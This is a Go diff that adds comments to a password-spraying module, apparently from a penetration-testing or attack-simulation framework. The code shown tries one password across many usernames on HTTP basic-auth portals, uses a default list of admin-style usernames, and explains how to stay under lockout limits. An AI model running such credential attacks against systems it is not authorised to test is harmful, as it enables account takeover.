@@ -19,6 +19,10 @@ import (
 // hosts, which keeps the attempt-to-lockout ratio low and mirrors the classic
 // password-spraying technique used in real engagements against web portals
 // protected by HTTP basic auth.
+//
+// The distinction from brute force matters: brute force hammers one account
+// with many passwords (fast lockout), while a spray uses one password across
+// many accounts, staying under the account-lockout threshold.
 type PasswordSpray struct{}
 
 // Meta implements attacks.Module.
@@ -65,6 +69,8 @@ func (*PasswordSpray) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightRepor
 // Run sprays the password against each host's web port.
 func (*PasswordSpray) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 	password := ctx.Conf.Get("auth.spray", "password")
+	// An explicit invocation option overrides the configured password — this
+	// is how the REPL allows one-off sprays without touching config.
 	if o, ok := opts["password"]; ok && o != "" {
 		password = o
 	}
@@ -92,6 +98,7 @@ func (*PasswordSpray) Run(ctx *attacks.AttackCtx, opts map[string]string) error 
 		}
 		base := fmt.Sprintf("%s://%s", scheme, net.JoinHostPort(t.host.IP.String(), strconv.Itoa(int(t.port))))
 		for _, user := range users {
+			// Cooperative shutdown: bail out between attempts, not mid-flight.
 			select {
 			case <-ctx.Done:
 				return nil
@@ -111,6 +118,8 @@ func (*PasswordSpray) Run(ctx *attacks.AttackCtx, opts map[string]string) error 
 			if resp.Body != nil {
 				resp.Body.Close()
 			}
+			// 401/403 means the credential was refused. Anything else with a
+			// valid basic-auth header is treated as accepted.
 			if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden {
 				time.Sleep(delay)
 				continue
@@ -135,7 +144,8 @@ func (*PasswordSpray) Run(ctx *attacks.AttackCtx, opts map[string]string) error 
 }
 
 // sprayUsers loads the username list: the auth.spray.users knob, a wordlist
-// file via auth.spray.wordlist, or the documented default list.
+// file via auth.spray.wordlist, or the documented default list. The fallback
+// chain keeps the module usable with zero configuration for quick smoke tests.
 func sprayUsers(ctx *attacks.AttackCtx) ([]string, error) {
 	if raw := ctx.Conf.Get("auth.spray", "users"); strings.TrimSpace(raw) != "" {
 		var out []string
@@ -161,7 +171,8 @@ func sprayUsers(ctx *attacks.AttackCtx) ([]string, error) {
 	return []string{"admin", "root", "user", "administrator", "test"}, nil
 }
 
-// readLines reads non-empty, trimmed lines from a file.
+// readLines reads non-empty, trimmed lines from a file. The scanner buffer is
+// bumped so very long lines in a wordlist do not trip the 64KiB default limit.
 func readLines(path string) ([]string, error) {
 	f, err := os.Open(path)
 	if err != nil {
@@ -170,6 +181,7 @@ func readLines(path string) ([]string, error) {
 	defer f.Close()
 	var out []string
 	sc := bufio.NewScanner(f)
+	// 64KiB start, up to 1MiB max token length.
 	sc.Buffer(make([]byte, 64*1024), 1024*1024)
 	for sc.Scan() {
 		line := strings.TrimSpace(sc.Text())
@@ -177,6 +189,7 @@ func readLines(path string) ([]string, error) {
 			out = append(out, line)
 		}
 	}
+	// sc.Err() surfaces read errors; scan stops on EOF with a nil error.
 	return out, sc.Err()
 }
 
@@ -197,4 +210,5 @@ func (*PasswordSpray) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
 // Cleanup is a no-op.
 func (*PasswordSpray) Cleanup(ctx *attacks.AttackCtx) error { return nil }
 
+// Compile-time assertion that PasswordSpray satisfies the Module contract.
 var _ attacks.Module = (*PasswordSpray)(nil)
